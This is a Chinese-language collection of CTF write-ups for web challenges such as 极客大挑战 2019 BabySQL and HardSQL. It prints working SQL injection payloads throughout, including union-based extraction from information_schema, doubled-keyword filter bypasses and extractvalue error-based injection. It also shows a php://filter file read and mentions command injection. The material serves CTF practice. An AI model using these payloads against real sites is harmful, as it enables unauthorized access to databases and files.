1、【极客大挑战2019】easy sql
先尝试随便输入username=admin,password=admin
发现url上显示了刚刚输入的，说明是get，
尝试用再url输入check.php?username=admin&password=admin and 1 =1


说明存在该输入情况，可使用sql注入
尝试最基本的sql注入uername=admin’ or 1=1#,password=1;

2、【极客大挑战2019】have fun
直接查看网页源代码









其中if语句是关键
直接再url上注入index.php?cat=dog
3、【ACTF2020新生赛】include

直接打开源代码，发现只存在一个文件file=flag.php
所以可能是php的伪协议
直接在url输入?file=php://filter/read=convert.base64-encode/resource=flag.php
得到一段代码，对该代码进行base解码即可
4、[SUCTF 2019]EasySQL

F12

表明要输入正确name
先输入1看看情况

出现回显点说明可以实现sql注入
再查看数据提交方式   输入1’
无反应  数字型数据
尝试绕过*，1

5、[强网杯 2019]随便注
题目提到安全问题，猜测是post提交
尝试输入’

猜测列名数量1' order by 1 # 

即有2个列名
查看表名0';show tables;#

有两个表
依次查看1919810931114514

6、[ACTF2020 新生赛]Exec1
尝试注入1

试试是不是本地地址注入127.0.0.1
出现回显，说明思路正确，尝试看一下目录
先可以试试直接找flag

直接就出来了
7、[极客大挑战 2019]LoveSQL1
和第一次一样先输入万能钥匙

出现类似与flag的东西，但试了一下发现不是
我们先尝试猜测列名数量

试出来只有3个
接下了就直接查看一下表名
一般查询表名的语句1’ union select 1,group_concat(table_name)e,3 from information_schema.tables where table_schema=database()#
我们这边直接注入就可以了

推断flag可能再10ve1ysq1中
下一步查看表的字段
1' union select 1, group_concat(column_name) ,3 from information_schema.columns where table_name='10ve1ysq1'#

接下来就查看字段里面的数据就好了
1' union select 1, group_concat(password),3  from l0ve1ysq1 #
7、[极客大挑战 2019]Secret File1
常规先查看源代码F12

看到有一个链接，直接点进去

太快了，试试抓包
放行之后看到了一个被注释的文件夹
打开这个文件夹看看

可以看到flag在file文件里面
这里是Filter伪协议，直接用该协议爆破康康

哈！马上就出来了，用base-64解码一下
出来啦！

8、[极客大挑战 2019]BabySQL
先和前面一样输入万能密码，报错。
再试试输入admin’ order by 1,2,3

发现报错的时候order by就剩下了der说明or和by都被过滤了，所以我们输入oorrder bbyy#来绕过一下



注入成功，再试试4可不可以

所以只有3个字段
查看一下

这里union select也被过滤掉了（好烦啊）
绕过一下


怎么还是这个
试试交换一下username和password

接下来我们来找一下数据库


接下来就查看一下表了
union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()
把过滤的部分双写
admin' ununionion seselectlect 1,group_concat(table_name),3 frfromom infoorrmation_schema.tables whwhereere table_schema=database()#（双写的部分真的很多）

猜猜flag在哪个里面
先试试第一个康康
3' ununionion seselectlect 1,2,group_concat(column_name) frfromom infoorrmation_schema.columns whwhereere table_name='b4bsql'#

接下来就看字段了，肯定是看password里面的
3' ununionion seselectlect 1,2, group_concat(column_name) frfromom infoorrmation_schema.columns whwhereere table_name='password'#

？没有？
试试从被b4bsql里看看
3' ununionion seselectlect 1,2,group_concat(username,passwoorrd) frfromom b4bsql#
出来啦！


9、[极客大挑战 2019]hardsql 1
先按之前的尝试一下万能密码和一般的sql注入

发现都显示这个，再试试order和union发现都不行
那么我们就可以试试强制类型报错
先来找一下数据库
1'or(extractvalue(1,concat(0x7e,(select(database())))))#


找到数据库后就要找表了
1'or(extractvalue(1,concat(0x7e,(select(table_name)from(information_schema.tables)where(table_schema)like('geek')))))#           这里的like本来是=，但被其过滤了，所以用like绕过

找完表后就可以查看字段了
1'or(extractvalue(1,concat(0x7e,(select(group_concat(password))from(H4rDsq1)))))# 

爆破右边
1'or(extractvalue(1,concat(0x7e,(select(right(password,30))from(H4rDsq1)))))# 

10、[GXYCTF2019]BabySQli
先尝试万能密码

第一反应去抓包试试

抓完，发现有一段被注释掉的字段
尝试了很多解码方式，发现都不对，
可能是二次加密，发现base32解码出来的像base64编码
尝试一下就出来了
说明判断时先判断用户名，再判断密码
所以先试试最常见的admin

说明用户名对了
就是admin
接下来就和之前差不多了
先用order by尝试查看列名数量
但发现被过滤
抱着试试的心态，尝试了一下联合注入
1’ union select 1#

2的时候也一样
但到了3，是
说明列名的数量为3
一般来说，2是username，3是password
但我们还是判断一下这道题有没有骗我们
尝试注入1' union select 1,'admin','123'# 

所以说初步判断正确
接下来判断可能是md5加密直接输入就好了
md5(123,32) = 202cb962ac59075b964b07152d234b70
直接输入就好了
1' union select 1,'admin','202cb962ac59075b964b07152d234b70'#
